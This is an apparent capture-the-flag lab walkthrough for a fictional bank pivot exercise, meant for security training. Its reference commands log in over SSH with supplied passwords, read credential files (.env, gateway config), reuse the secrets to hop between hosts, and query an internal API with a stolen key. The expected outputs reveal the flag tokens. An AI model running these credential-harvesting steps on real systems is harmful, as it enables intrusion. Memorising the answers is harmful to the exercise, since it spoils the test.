# Meridian Trust Bank - Three-Hop Pivot

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-4-3-three-hop-pivot/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Meridian Trust Bank - Three-Hop Pivot** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **55 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Meridian Trust Bank, a mid-size commercial bank headquartered in Denver, has
engaged your red team for an internal network penetration test. Phase 1 is
complete - your team obtained SSH credentials for a teller workstation through
a social engineering engagement:

  Username: teller
  Password: M3r1d14n_T3ll3r#

Your team lead, Sarah Chen, briefs you: "We have a foothold on one of their
teller machines. Meridian's CISO insists their internal segmentation prevents
lateral movement - the teller systems can't reach anything sensitive. I need
you to prove otherwise. Work your way from the teller box to their app server,
then from there to the core banking API. Each hop should get you closer to
their crown jewels. Document everything for the report."

Three assessment tokens have been placed across the environment. Collect all
three to assemble the flag and demonstrate the full lateral-movement chain.

## Your Objectives

- SSH into the teller workstation using provided credentials
- Discover database credentials stored in a banking application config file
- Pivot laterally to an internal application server using discovered credentials
- Extract an API key from the application server's gateway configuration
- Authenticate to the core API service and retrieve the final assessment token
- Assemble the flag from tokens collected across all three hosts
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SSH to host-a as teller**

```bash
sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@<target> 'whoami' 2>&1
```

Expected: `teller`

**Read DB config from host-a to discover host-b credentials**

```bash
sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@<target> 'cat /var/www/banking-app/.env 2>/dev/null | grep DB_PASS' 2>&1
```

Expected: `M3r1d14n_App_2024#`

**Read token 1 from host-a**

```bash
sshpass -p '{cred.teller.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.teller.user}@<target> 'cat /home/teller/assessment_token.txt' 2>&1
```

Expected: `thr33`

**SSH to host-b with discovered credentials**

```bash
sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@<target> 'whoami' 2>&1
```

Expected: `appuser`

**Read API config from host-b and get token 2**

```bash
sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@<target> 'cat /opt/meridian/services/api-gateway/config.yml 2>/dev/null && echo --- && cat /home/appuser/marker.txt' 2>&1
```

Expected: `h0p`

**Curl host-c API with discovered API key to get token 3**

```bash
sshpass -p '{cred.appuser.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.appuser.user}@<target> 'curl -s -H "X-API-Key: MTB_k3y_h0p_l4t3r4l" http://meridian-core:8080/api/vault' 2>&1
```

Expected: `l4t3r4l`

**Assemble and verify complete flag**

```bash
echo 'OCR{...}'
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

Start by exploring the teller workstation. Web applications often store
database credentials in environment files. Check /var/www/ for application
directories containing .env files. The database host, username, and password
will let you reach the next system.

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

On the application server, look for service configuration files. API gateway
configs are commonly stored under /opt/ in YAML format. The config will
contain both an API endpoint and authentication key for the core service.
Also check the home directory for assessment tokens.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

Use curl to query the core API. The endpoint is on port 8080 at the /api/vault
path. You need to pass the API key in an X-API-Key header. Combine all three
tokens in the format: first_second_third to build the flag.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
